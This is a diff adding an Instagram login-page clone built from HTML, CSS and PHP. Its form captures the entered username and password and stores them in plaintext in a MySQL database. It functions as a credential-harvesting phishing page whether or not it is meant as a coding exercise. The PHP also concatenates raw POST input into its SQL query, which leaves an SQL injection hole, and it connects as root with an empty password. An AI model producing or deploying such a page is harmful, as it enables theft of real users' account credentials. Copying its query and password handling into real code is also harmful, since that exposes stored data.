@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <style type="text/css">@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700&family=Ubuntu:wght@300;400;500&display=swap');
+* {
+    padding: 0;
+    margin: 0;
+    outline: 0;
+    text-decoration: none;
+}
+
+body {
+    background-color: #fff;
+    font-family: 'Roboto', sans-serif;
+}
+
+main {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 100px;
+    min-height: 100vh;
+    margin: auto;
+}
+
+.form-div {
+    display: flex;
+    flex-direction: column;
+}
+
+.form-div form {
+    display: flex;
+    flex-direction: column;
+    text-align: center;
+    align-items: center;
+    justify-content: center;
+    padding: 3vh 2vw;
+    border: 1px solid rgba(128, 128, 128, 0.3);
+}
+
+.form-div form .instaLogo {
+    width: 200px;
+    margin: 20px 0;
+}
+
+.form-div form .input {
+    width: 90%;
+    padding: .6rem;
+    border-radius: 8px;
+    border: 1px solid rgba(128, 128, 128, 0.3);
+    margin: 3px;
+}
+
+.login-btn {
+    width: 97%;
+    padding: .4rem;
+    font-weight: 700;
+    background-color: rgb(1, 183, 255);
+    border: none;
+    border-radius: 8px;
+    margin: 8px 0px;
+    color: white;
+}
+
+#or {
+    margin: 20px 0;
+}
+
+#or:before,
+#or:after {
+    content: '------------------------';
+    color: rgba(128, 128, 128, 0.7);
+    margin: 0 10px;
+}
+
+.fb-login {
+    font-weight: 700;
+    font-size: 95%;
+    color: rgb(85, 0, 255);
+    margin-bottom: 30px;
+    margin-top: 10px;
+}
+
+.sign-up {
+    text-align: center;
+    border: 1px solid rgba(128, 128, 128, 0.3);
+    padding: 20px;
+    margin: 10px;
+}
+
+.get-app {
+    display: flex;
+    flex-direction: column;
+    text-align: center;
+}
+
+.store {
+    display: flex;
+    align-items: center;
+}
+
+#play {
+    width: 190px;
+}
+
+#microsoft {
+    width: 135px;
+    border-radius: 8px;
+}</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <title>Instagram Login - CodeWithJatin</title>
+</head>
+
+<body>
+
+<?php
+
+if ($_SERVER['REQUEST_METHOD'] =='POST'){
+
+$Username=$_POST['Username'];
+$Password =$_POST['password'];
+
+
+//connecting to the databases
+
+$servername = "localhost";
+$username ="root";
+$password ="";
+$database ="instagram";
+
+
+//create an connection
+
+$connect = mysqli_connect($servername,$username,$password,$database);
+
+         if (!$connect){
+
+                 die(mysqli_connect_error("error connecting to database"));
+
+
+                       }
+                       else{
+
+
+                        //insert data
+                       $sql = "INSERT INTO `users` (`Username`, `Password`) VALUES ('$Username','$Password')";
+                       $result = mysqli_query($connect, $sql);
+
+
+         if ($result){
+
+                  echo 'success';
+                       }
+                       else{
+                           //cho mysql_error($connect);
+                           echo"you are not submitted successufully";
+                       }
+
+
+
+            }
+
+}
+
+?>
+    <main>
+        <img src="https://github.com/jatin4rya/V8-Instagram-Login-Clone/blob/main/IG.jpeg?raw=true" alt="" class="phoneImg">
+        <div class="form-div">
+            <form action="/php/insta.php" method="post">
+                <img class="instaLogo" src="https://github.com/jatin4rya/V8-Instagram-Login-Clone/blob/main/instaLogo.png?raw=true" alt="logo">
+
+
+
+              <input type="input"class="input"placeholder="phone number username or email"required id="input" name="Username">
+                <input type="password" class="input" required placeholder="password" id="password" name="password">
+                <button class="login-btn">Log In</button>
+                <p id="or">or</p>
+                <a href="#" class="fb-login"><i class='bx bxl-facebook-square'></i>Log in with Facebook</a>
+            </form>
+            <div class="sign-up">
+                <p>Don't have an account? <a href="#" class="sign-link">Sign up</a></p>
+            </div>
+            <div class="get-app">
+                <p>Get the app</p>
+                <div class="store">
+                    <img id="play" src="https://github.com/jatin4rya/V8-Instagram-Login-Clone/blob/main/playStore.png?raw=true" alt="">
+                    <img id="microsoft" src="https://github.com/jatin4rya/V8-Instagram-Login-Clone/blob/main/getMicrosoft.png?raw=true" alt="">
+                </div>
+            </div>
+        </div>
+    </main>
+</body>
+
+</html>
